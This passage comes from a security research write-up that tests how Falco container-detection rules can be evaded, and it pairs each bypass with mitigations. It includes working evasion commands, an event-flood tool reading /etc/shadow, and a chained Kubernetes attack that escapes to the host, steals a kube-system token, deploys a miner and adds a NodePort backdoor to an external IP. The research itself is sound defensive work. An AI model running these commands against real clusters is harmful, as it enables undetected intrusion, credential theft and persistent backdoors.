01:43:32.114285216: Critical Detect Sudo Privilege Escalation Exploit (CVE-2021-3156) (user=<NA> parent=sh cmdline=sudoedit -s \ id k8s.ns=<NA> k8s.pod=<NA> container=018ccf061927) k8s.ns=<NA> k8s.pod=<NA> container=018ccf061927
01:43:56.780577427: Critical Detect Sudo Privilege Escalation Exploit (CVE-2021-3156) (user=<NA> parent=sh cmdline=sudoedit -i \ id k8s.ns=<NA> k8s.pod=<NA> container=018ccf061927) k8s.ns=<NA> k8s.pod=<NA> container=018ccf061927
-----
```
Now, if we take look at sudoedit usage we see that _-i_ is also _--login_ and that defeats the rule easily:
```
[Container]
$ sudoedit --login '\' 'id'
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout]
                [-u user] file ...
-----
[Falco]
SILENCE
```
The same does not work for _-s_ flag because _-s_ is a substring of _--shell_ and thus `proc.args contains -s` evaluates to TRUE. Instead, we can collate the flags as with the previous bypass:
```
$ sudoedit -ns '\' 'id'
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout]
                [-u user] file ...
-----
[Falco]
SILENCE
```
Where _-n_ is a non-interactive flag, but any other flag that does not alter the core functionality can be used here.

Finally, rule **Mount Launched in Privileged Container** uses a unique construct `proc.args intersects ("-V", "-l", "-h")`, meaning the command argument cannot contain any other flags and therefore is more restrictive than "contains" operator. As such, I could not find an arguments-based bypass, however, the rule is still bypassable through other means as it relies on _proc.name_ comparison.

<ins>Rules bypassed:</ins> 
- **Netcat Remote Code Execution in Container**
- **Search Private Keys or Passwords**
- **Sudo Potential Privilege Escalation**

<ins>Suggested mitigations:</ins> Review the flags substitutes (i.e. _-i_ vs _--login_); make flag parsing more robust to detect flags collations (i.e. `-ve /bin/bash`); expand intersect operator to other rules.

### Bypass sensitive mounts

Mounting host directories into the container reduces the isolation level of the container. This is especially true for the sensitive directories, such as docker socket or /etc. Rule **Launch Sensitive Mount Container** detects such scenario, however, not all of the mounting scenarios are considered in `sensitive_mount` macro:
```
- macro: sensitive_mount
  condition: (container.mount.dest[/proc*] != "N/A" or
              container.mount.dest[/var/run/docker.sock] != "N/A" or
              container.mount.dest[/var/run/crio/crio.sock] != "N/A" or
              ...
```
Attacker can bypass this condition when mounting a parent directory like so:
```
[Container]
$ docker run -v /var/run:/var/run -it sshayb/fuber:latest bash
root@6d9a802b60f2:/tmp# ./gdocker ps
CONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS               NAMES
6d9a802b60f2        sshayb/fuber:latest      "bash"                   14 seconds ago      Up 13 seconds                           focused_pasteur
...
-----
[Falco]
18:38:13.924712359: Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 k8s.ns=<NA> k8s.pod=<NA> container=6d9a802b60f2 shell=bash parent=<NA> cmdline=bash terminal=34816 container_id=6d9a802b60f2 image=sshayb/fuber) k8s.ns=<NA> k8s.pod=<NA> container=6d9a802b60f2
```
Same bypass will work when specifying mounts in K8s object yaml's.

<ins>Rules bypassed:</ins> **Launch Sensitive Mount Container**.

<ins>Suggested mitigations:</ins> Use glob (as in `/var/*`) or block parent directories manually.

### Bypass crypto mining detections

Falco default ruleset has two rules able to detect a crypto miner: **Detect outbound connections to common miner pool ports** and **Detect crypto miners using the Stratum protocol**. However, the former is disabled by default due to noisiness and the latter is bypassable. Taking a closer look at **Detect crypto miners using the Stratum protocol** conditions we see that it depends on creation of the new process while looking for `stratum+tcp` in command line arguments. This condition is too restrictive for three reasons: first, it does not take into account the new stratum V2 protocol developed recently[^6]; secondly, stratum is merely a protocol to support a pool mining mode with direct mining mode ignored; (3) the rule does not take into account the possibility of a miner starting without the pool url and adding it at a later stage.

<ins>Rules bypassed:</ins> **Detect crypto miners using the Stratum protocol**

<ins>Suggested mitigations:</ins> Include new stratum protocol; consider refactoring the rule to capture all miners.

### Bypass privileged container detections

Launching a privileged container is an easy way towards container escape. Rule **Launch Privileged Container** is based on the following condition: `container.privileged=true`. From the feature description[^7] we can see that _container.privileged_ construct is only supported on Docker and returns NULL for other container environments. We can use it to bypass the rule:
```
[Container]
$ docker run --privileged -it debian:10.2 ls /dev
agpgart    loop3         sda3      tty22  tty48    usbmon0
...
-----
[Falco]
19:39:48.275656924: Notice Privileged container started (user=root user_loginuid=0 command=container:9cc87ddac92a k8s.ns=<NA> k8s.pod=<NA> container=9cc87ddac92a image=debian:10.2) k8s.ns=<NA> k8s.pod=<NA> container=9cc87ddac92a
-----
[Conatainer]
sudo podman run --privileged -it alpine:latest ls /dev
agpgart             net                 tty20               tty58
-----
[Falco]
19:43:32.514735767: Notice Namespace change (setns) by unexpected program (user=root user_loginuid=1001 command=podman run --privileged -it alpine:latest ls /dev parent=podman k8s.ns=<NA> k8s.pod=<NA> container=host container_id=host image=<NA>:<NA>) k8s.ns=<NA> k8s.pod=<NA> container=host
```
We can see that podman invokes namespace change when launching container, but no other rules triggered. This has a far-fetching consequences for K8s clusters running other-than-the-Docker runtimes, because privilege pod launch is a standard step on the attacker's way to achieve cluster compromise.

<ins>Rules bypassed:</ins> **Launch Privileged Container**

<ins>Suggested mitigations:</ins> Implement _container.privileged_ on other container runtimes.

## <a name="cve"></a>A Word on CVE-2019-8339 and Falco Denial of Service

In v0.15.0 Falco maintainers fixed a Denial of Service vulnerability. A flood of events initiated by an attacker, either in a container or on a host, could overwhelm the Falco ring buffer and cause it to drop relevant events. The vulnerability was addressed through multiple vectors, but the underlying premise is still there - an attacker can try to DoS Falco through event bursts while sneaking the malicious event in between the bursts. This was the premise of my tests: [fuber-dos utility](fubers/fuber-dos.c) generates a desired number of _open_ system calls while squeezing another, potentially malicious command, in between. Local cluster tests were performed on the CentOS7 4G VM. Interestingly, the results were different depending on the environment. Following is the list of the tested environment along with the achieved bypass effect.

### On a host
When running the utility on the host, 200K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on a semi-regular basis. Out of 10 tries, only 7 of them detected "Sensitive file opened" successfully:
```
[Host]
$ fubers/fuber-dos 100000 "sudo cat /etc/shadow"
OUTPUT: root:$6$LrM
...
-----
[Falco]
16:41:47.445369441: Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=1001 program=cat command=cat /etc/shadow file=/etc/shadow parent=sudo gparent=fuber-dos ggparent=bash gggparent=<NA> container_id=host image=<NA>) k8s.ns=<NA> k8s.pod=<NA> container=host k8s.ns=<NA> k8s.pod=<NA> container=host
16:41:48.165897667: Debug Falco internal: syscall event drop. 177560 system calls dropped in last second. (ebpf_enabled=0 n_drops=177560 n_drops_buffer=177560 n_drops_bug=0 n_drops_pf=0 n_evts=709839)
-----
[Host]
$ fubers/fuber-dos 200000 "sudo cat /etc/shadow"
OUTPUT: root:$6$..
OUTPUT: bin:*:17834:0:99999:7:::
OUTPUT: daemon:*:17834:0:99999:7:::
...
-----
[Falco]
16:39:22.454119032: Debug Falco internal: syscall event drop. 506027 system calls dropped in last second. (ebpf_enabled=0 n_drops=506027 n_drops_buffer=506027 n_drops_bug=0 n_drops_pf=0 n_evts=973382)
16:39:23.455681284: Debug Falco internal: syscall event drop. 334965 system calls dropped in last second. (ebpf_enabled=0 n_drops=334965 n_drops_buffer=334965 n_drops_bug=0 n_drops_pf=0 n_evts=650240)
```
### On a docker container
When running the utility on a docker container with a cluster running alongside, 300K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on a semi-regular basis. Out of 10 tries, only 4 of them detected "Sensitive file opened" successfully:
```
[Container]
$ docker run -it sshayb/fuber:latest bash
root@b2e38b90b032:/tmp/fubers# ./fuber-dos 200000 'cat /etc/shadow'
OUTPUT: root:*:18759:0:99999:7:::
...
-----
[Falco]
16:59:09.482207892: Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=-1 program=cat command=cat /etc/shadow file=/etc/shadow parent=sh gparent=fuber-dos ggparent=bash gggparent=<NA> container_id=b2e38b90b032 image=sshayb/fuber) k8s.ns=<NA> k8s.pod=<NA> container=b2e38b90b032 k8s.ns=<NA> k8s.pod=<NA> container=b2e38b90b032
16:59:09.580277182: Debug Falco internal: syscall event drop. 759590 system calls dropped in last second. (ebpf_enabled=0 n_drops=759590 n_drops_buffer=759590 n_drops_bug=0 n_drops_pf=0 n_evts=1324594)
-----
[Container]
root@b2e38b90b032:/tmp/fubers# ./fuber-dos 300000 'cat /etc/shadow'
OUTPUT: root:*:18759:0:99999:7:::
...
-----
[Falco]
16:59:10.581941243: Debug Falco internal: syscall event drop. 209081 system calls dropped in last second. (ebpf_enabled=0 n_drops=209081 n_drops_buffer=209081 n_drops_bug=0 n_drops_pf=0 n_evts=292670)
16:59:39.630383698: Debug Falco internal: syscall event drop. 815406 system calls dropped in last second. (ebpf_enabled=0 n_drops=815406 n_drops_buffer=815406 n_drops_bug=0 n_drops_pf=0 n_evts=1261422)
16:59:40.636155254: Debug Falco internal: syscall event drop. 771462 system calls dropped in last second. (ebpf_enabled=0 n_drops=771462 n_drops_buffer=771462 n_drops_bug=0 n_drops_pf=0 n_evts=1164448)
```
### On a pod within a local cluster ran by Kubeadm
When running the utility on a pod within the Kubeadm cluster, 100K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on an irregular basis. Out of 10 tries, 8 of them detected "Sensitive file opened" successfully:
```
[Pod]
$ kubeadm version
kubeadm version: &version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.1", GitCommit:"5e58841cce77d4bc13713ad2b91fa0d961e69192", GitTreeState:"clean", BuildDate:"2021-05-12T14:17:27Z", GoVersion:"go1.16.4", Compiler:"gc", Platform:"linux/amd64"}
$ kubectl get pods
NAME                           READY   STATUS    RESTARTS   AGE
falco-l7l85                    1/1     Running   3          13d
frontend-5fd859dcf6-d9m7p      1/1     Running   3          13d
frontend-5fd859dcf6-nn9kr      1/1     Running   3          13d
frontend-5fd859dcf6-vqsv5      1/1     Running   3          13d
redis-master-f46ff57fd-r8z9g   1/1     Running   3          13d
redis-slave-597454578-l66rb    1/1     Running   3          13d
redis-slave-597454578-z25nw    1/1     Running   3          13d
$ kubectl exec -it frontend-5fd859dcf6-d9m7p bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@frontend-5fd859dcf6-d9m7p:/var/www/html# cd /tmp
root@frontend-5fd859dcf6-d9m7p:/tmp# ./fuber-dos 10000 'cat /etc/shadow'
OUTPUT: root:*:16895:0:99999:7:::
...
-----
[Falco]
17:08:35.118134521: Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=-1 program=cat command=cat /etc/shadow file=/etc/shadow parent=sh gparent=fuber-dos ggparent=bash gggparent=<NA> container_id=6ba4fc748b8c image=gcr.io/google-samples/gb-frontend) k8s.ns=default k8s.pod=frontend-5fd859dcf6-d9m7p container=6ba4fc748b8c k8s.ns=default k8s.pod=frontend-5fd859dcf6-d9m7p container=6ba4fc748b8c
-----
[Pod]
root@frontend-5fd859dcf6-d9m7p:/tmp# ./fuber-dos 100000 'cat /etc/shadow'
OUTPUT: root:*:16895:0:99999:7:::
-----
[Falco]
17:11:51.948645683: Debug Falco internal: syscall event drop. 474099 system calls dropped in last second. (ebpf_enabled=0 n_drops=474099 n_drops_buffer=474099 n_drops_bug=0 n_drops_pf=0 n_evts=807893)
```
### On a pod within a local cluster ran by Minicube
When running the utility on a pod within the Minicube cluster, 200K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on an irregular basis. Out of 10 tries, 9 of them detected "Sensitive file opened" successfully:
```
[Pod]
minikube version
minikube version: v1.13.0
commit: 0c5e9de4ca6f9c55147ae7f90af97eff5befef5f-dirty
$ kubectl get pods
NAME                           READY   STATUS    RESTARTS   AGE
falco-nqwnv                    1/1     Running   0          9m50s
frontend-5fd859dcf6-7ptkt      1/1     Running   2          23d
frontend-5fd859dcf6-qxd5q      1/1     Running   2          23d
frontend-5fd859dcf6-x5nj6      1/1     Running   2          23d
redis-master-f46ff57fd-85ptf   1/1     Running   2          23d
redis-slave-597454578-hvtsr    1/1     Running   2          23d
redis-slave-597454578-wnj6f    1/1     Running   2          23d
$ kubectl exec -it frontend-5fd859dcf6-7ptkt bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@frontend-5fd859dcf6-7ptkt:/var/www/html# cd /tmp
root@frontend-5fd859dcf6-7ptkt:/tmp# ./fuber-dos 100000 "cat /etc/shadow"
OUTPUT: root:*:16895:0:99999:7:::
-----
[Falco]
17:52:02.514419393: Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=-1 program=cat command=cat /etc/shadow file=/etc/shadow parent=sh gparent=fuber-dos ggparent=bash gggparent=<NA> container_id=9eec5c06b381 image=gcr.io/google-samples/gb-frontend) k8s.ns=default k8s.pod=frontend-5fd859dcf6-7ptkt container=9eec5c06b381 k8s.ns=default k8s.pod=frontend-5fd859dcf6-7ptkt container=9eec5c06b381
17:52:03.324391470: Debug Falco internal: syscall event drop. 271083 system calls dropped in last second. (ebpf_enabled=0 n_drops=271083 n_drops_buffer=271083 n_drops_bug=0 n_drops_pf=0 n_evts=593579)
-----
[Pod]
root@frontend-5fd859dcf6-7ptkt:/tmp# ./fuber-dos 200000 "cat /etc/shadow"
OUTPUT: root:*:16895:0:99999:7:::
-----
[Falco]
17:52:34.490040628: Debug Falco internal: syscall event drop. 251402 system calls dropped in last second. (ebpf_enabled=0 n_drops=251402 n_drops_buffer=251402 n_drops_bug=0 n_drops_pf=0 n_evts=663604)
17:52:35.522799637: Debug Falco internal: syscall event drop. 461811 system calls dropped in last second. (ebpf_enabled=0 n_drops=461811 n_drops_buffer=461811 n_drops_bug=0 n_drops_pf=0 n_evts=951413)
```
### On GKE managed cluster
When running the utility on a GKE managed cluster, 200K fake events seem to be enough to cause Falco to consistently drop events and bypass detection on an irregular basis. Out of 10 tries, 9 of them detected "Sensitive file opened" successfully:
```
[Pod]
dashboard@dashboard-759c6f5d84-njd78:/tmp$ ./fuber-dos 100000 'kubectl get pods'
OUTPUT: NAME                         READY   STATUS    RESTARTS   AGE
OUTPUT: app-684574fb99-5gvwj         1/1     Running   0          7d9h
OUTPUT: dashboard-759c6f5d84-njd78   2/2     Running   0          7d9h
OUTPUT: db-6cdcb49cc6-zlzr5          1/1     Running   0          7d9h
-----
[Falco]
19:12:53.090774732: Warning Docker or kubernetes client executed in container (user=<NA> user_loginuid=-1 k8s.ns=prd k8s.pod=dashboard-759c6f5d84-njd78 container=e3180521af98 parent=sh cmdline=kubectl get pods image=securekubernetes/example-dashboard:latest) k8s.ns=prd k8s.pod=dashboard-759c6f5d84-njd78 container=e3180521af98
19:12:53.209708139: Notice Unexpected connection to K8s API Server from container (command=kubectl get pods k8s.ns=prd k8s.pod=dashboard-759c6f5d84-njd78 container=e3180521af98 image=securekubernetes/example-dashboard:latest connection=10.28.0.4:43182->10.32.0.1:443) k8s.ns=prd k8s.pod=dashboard-759c6f5d84-njd78 container=e3180521af98
-----
[Pod]
dashboard@dashboard-759c6f5d84-njd78:/tmp$ ./fuber-dos 200000 'kubectl get pods'
OUTPUT: NAME                         READY   STATUS    RESTARTS   AGE
OUTPUT: app-684574fb99-5gvwj         1/1     Running   0          7d9h
OUTPUT: dashboard-759c6f5d84-njd78   2/2     Running   0          7d9h
OUTPUT: db-6cdcb49cc6-zlzr5          1/1     Running   0          7d9h
-----
[Falco]
19:13:49.494977284: Debug Falco internal: syscall event drop. 59240 system calls dropped in last second. (ebpf_enabled=1 n_drops=59240 n_drops_buffer=0 n_drops_bug=59240 n_drops_pf=0 n_evts=295199)
19:13:50.494978484: Debug Falco internal: syscall event drop. 59240 system calls dropped in last second. (ebpf_enabled=1 n_drops=59240 n_drops_buffer=59240 n_drops_bug=0 n_drops_pf=0 n_evts=137981)
19:13:53.539298970: Debug Falco internal: syscall event drop. 11689 system calls dropped in last second. (ebpf_enabled=1 n_drops=11689 n_drops_buffer=11689 n_drops_bug=0 n_drops_pf=0 n_evts=26584)
```
<ins>Conclusion:</ins> Based on this limited testing, the fixes introduced in v0.15.0 were largely successful in mitigating the attack. Even though the DoS attack may seem attractive, in practice an attacker will risk exposing themselves not only through "Falco internal: syscall event drop" event (that might be easily ignored), but also through the original rule trigger. In one of the recent CNCF presentations[^8] by Shopify the presentor advises the users to lower the priority of the drop event to LOG level. My recommendation is to keep treating event loss as CRITICAL - there might be an attacker behind the event loss.

## Putting it All Together for a Full Attack Simulation

To be sure, bypassing a single rule will not lead to the full unnoticed cluster compromise. As we have seen in multiple cases any particular malicious action can trigger one or more rules. The ultimate test for successful bypass is if the attacker is able to chain the individual rules bypasses into a successful attack chain that does not trip the Falco alarms. The hidden assumption here is the successful tuning of the Falco rules within the customer environment and a premise that even one rule trigger will alert the SOC. It is debatable how practical this assumption is but let us put it to the test.

As an attack simulation platform, I chose securekubernetes training [cluster](https://securekubernetes.com/) presented at Kubecon NA 2019. Its main purpose is to provide a realistic training environment for security professionals interested in securing K8s clusters. The platform offers a unique perspective from both attacker and defender sides and splits the training into two scenarios: Basic attack and defense ([Scenario 1](https://securekubernetes.com/scenario_1_attack/)) and Advanced attack and defense ([Scenario 2](https://securekubernetes.com/scenario_2_attack/)). Among other things, the defense phase includes deploying Falco.

But even before we start Scenario 1, we install Falco on the training cluster with several commands:

```
helm repo add stable https://charts.helm.sh/stable
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
export FALCO_BPF_PROBE=""
helm install falco falcosecurity/falco --set ebpf.enabled=true
```

The attack scenario assumes initial pod access is given to the Red attacker through email and the scenario starts with the shell in the compromised production dashboard pod. We run the list of the commands described in Scenario 1. These commands lead to the coin miner running on the cluster - from the enumeration and info gathering to the spinning of the bitcoinero pod. These commands result in 3 rules triggering overall 16 times. Arguably this should be enough to alert an observant SOC. An even more realistic scenario is the one where Red runs one of the enumeration / privilege escalation scripts. On the example of linpeas.sh[^9]:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ curl -LO https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ chmod +x linpeas.sh
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./linpeas.sh
-----
[Falco]
21:18:06.435080411: Warning Grep private keys or passwords activities found (user=<NA>
...
```

Overall, Falco reports 99 events. This is quite noisy from a supposedly stealthy activity. We expect even more noise from Scenario 2, where attacker DarkRed uses even more advanced techniques to re-deploy the same mining pod and to expose the NodePort for future access. Perhaps the most important command in the sequence for Scenario 2 is the one-liner breaking from the pod into the host:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
If you don't see a command prompt, try pressing enter.
r00t1 / #
-----
[Falco]
11:46:21.259775504: Warning Docker or kubernetes client executed in container (user=<NA> user_loginuid=-1 k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 parent=bash cmdline=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} image=securekubernetes/example-dashboard:latest) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
11:46:21.361024068: Notice Unexpected connection to K8s API Server from container (command=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:46520->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
11:46:23.500801258: Notice Privileged container started (user=<NA> user_loginuid=0 command=container:3af88f406740 k8s.ns=prd k8s.pod=r00t1 container=3af88f406740 image=alpine:latest) k8s.ns=prd k8s.pod=r00t1 container=3af88f406740
11:46:23.518207080: Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 k8s.ns=prd k8s.pod=r00t1 container=3af88f406740 shell=bash parent=<NA> cmdline=bash terminal=34816 container_id=3af88f406740 image=alpine) k8s.ns=prd k8s.pod=r00t1 container=3af88f406740
11:46:24.236488771: Notice Unexpected connection to K8s API Server from container (command=kubectl run r00t1 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:46526->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
```

Falco emits 5 events from 4 different rules. However, all is not lost, let us see how we can bypass the detections based on what we have learned until now (hint - we will be using fuber:latest):

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.17/bin/linux/amd64/kubectl
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ mv kubectl kctl
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ chmod +x kctl
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti--rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker ps"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}}'
CONTAINER ID   IMAGE COMMAND                  CREATED             STATUS                  PORTSNAMES
c2fec73bf388   354571a19ce4 "/tmp/gbash -c '/tmp…"   1 second ago        Up Less than a secondk8s_1_r00t3_prd_b2526988-51e4-45e2-a599-5a59703b1762_0
5c9821487eb2   k8s.gcr.io/pause:3.2 "/pause"                 1 second ago        Up Less than a secondk8s_POD_r00t3_prd_b2526988-51e4-45e2-a599-5a59703b1762_0
...
----
[Falco]
12:08:30.674813209: Notice Unexpected connection to K8s API Server from container (command=kctl run r00t3 --restart=Never -ti --rm --image lol --overrides {"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker ps"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}} k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2 image=securekubernetes/example-dashboard:latest connection=10.48.0.8:49138->10.52.0.1:443) k8s.ns=prd k8s.pod=dashboard-56755cd6c9-6dk6v container=b1814c27d1d2
```

With only one NOTICE we have control over the docker socket on the node - this will allow us to start the bitcoin miner:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","/tmp/gdocker run -d securekubernetes/bitcoinero -c1 -l10"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/run","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/run"}}]}}'
100fe01721422621c64d3689694af5a5937a3384c76bec7cf761c61319e92add
pod "r00t3" deleted
```

To summarize, we have performed the following evasion:
* in fuber:latest - /tmp/gbash is a symlink to bash to bypass **Terminal shell in container**
* in fuber:latest - docker binary disguised as a /tmp/gdocker to bypass **The docker client is executed in a container** (this is actually not needed as we use node's docker after the pid namespace mounting)
* in fuber:latest - nsenter disguised as a runc-nsenter to bypass **Change thread namespace** (update: this rule was actually disabled by default later in https://github.com/falcosecurity/falco/pull/1632)
* map _/var/run_ and not _/var/run/docker.sock_ to bypass **Launch Sensitive Mount Container** rule

Can we go further following Scenario 2 and set up the backdoor through NodePort? The next step would be to get secret token for kube-system namespace, for this we need access to the node's _/var/lib_ path:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","ls -la /var/lib/kubelet/pods"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
total 88
drwxr-x--- 22 root root 4096 Oct 17 12:41 .
drwxr-xr-x  8 root root 4096 Oct 17 09:37 ..
drwxr-x---  5 root root 4096 Oct 17 10:11 1124fa37-747a-4fc5-af24-dd2ccc64ce89
drwxr-x---  5 root root 4096 Oct 17 09:40 12a640d3-6f7b-45b5-92a5-537772e2774a
...
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/namespace"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
prdkube-systemdevprdkube-systemkube-systemkube-systemdevkube-systemprddevkube-systemkube-systemprdkube-systemprddefaultpod "r00t3" deleted
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl run r00t3 --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"sshayb/fuber:latest","command":["/tmp/gbash"],"args":["-c","cat /var/lib/kubelet/pods/12a640d3-6f7b-45b5-92a5-537772e2774a/volumes/kubernetes.io~secret/default-token-hnhmm/token"],"stdin": true,"tty":true,"volumeMounts": [{"mountPath": "/var/lib","name": "test"}],"imagePullPolicy":"IfNotPresent"}],"volumes": [{"name":"test","hostPath":{"path": "/var/lib"}}]}}'
eyJhbGciO...uMP08h9jzgpod "r00t3" deleted
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ ./kctl --token "eyJhb...8h9jzg" auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []     [*]
                                                [*]                 []     [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []     [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []     [create]
                                                [/api/*]            []     [get]
                                                [/api]              []     [get]
                                                [/apis/*]           []     [get]
                                                [/apis]             []     [get]
                                                [/healthz]          []     [get]
                                                [/healthz]          []     [get]
                                                [/livez]            []     [get]
                                                [/livez]            []     [get]
                                                [/openapi/*]        []     [get]
                                                [/openapi]          []     [get]
                                                [/readyz]           []     [get]
                                                [/readyz]           []     [get]
                                                [/version/]         []     [get]
                                                [/version/]         []     [get]
                                                [/version]          []     [get]
                                                [/version]          []     [get]
```

As expected, with kube-system token we can create K8s objects. Final step in the compromise according to Scenario 2:

```
[Compromised Pod]
dashboard@dashboard-56755cd6c9-6dk6v:/tmp$ cat <<EOF | ./kctl --token "eyJhbGciOi...MP08h9jzg" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f -
> apiVersion: v1
> kind: Service
> metadata:
>   name: istio-mgmt
>   namespace: kube-system
> spec:
>   type: NodePort
>   ports:
>     - protocol: TCP
>       nodePort: 31313
>       port: 31313
>       targetPort: $KUBERNETES_SERVICE_PORT
> ---
> apiVersion: v1
> kind: Endpoints
> metadata:
>   name: istio-mgmt
>   namespace: kube-system
> subsets:
>   - addresses:
>       - ip: 35.247.21.15
>     ports:
>       - port: $KUBERNETES_SERVICE_PORT
> EOF
service/istio-mgmt unchanged
endpoints/istio-mgmt configured
-----
[Node]
sshayb@cloudshell:~$ kubectl get services --all-namespaces
NAMESPACE     NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)           AGE
default       kubernetes             ClusterIP   10.52.0.1      <none>        443/TCP           3h37m
...
kube-system   istio-mgmt             NodePort    10.52.3.176    <none>        31313:31313/TCP   146m
```

All in all, we are successful in deploying the hidden workload on the compromised cluster and in addition deploying a NodePort as a future backdoor access. At the same time, we are careful enough not to trigger any rules except **Contact K8S API Server From Container**, which would result in multiple NOTICEs that might or might not fly under the radar of a vigilant SOC.

Can we do better than that? Careful inspection of rule **Contact K8S API Server From Container** provides hints on the potential way - what if we use one of the container images excepted in macro k8s_containers?

```
- macro: k8s_containers
  condition: >
    (container.image.repository in (gcr.io/google_containers/hyperkube-amd64,
     gcr.io/google_containers/kube2sky,
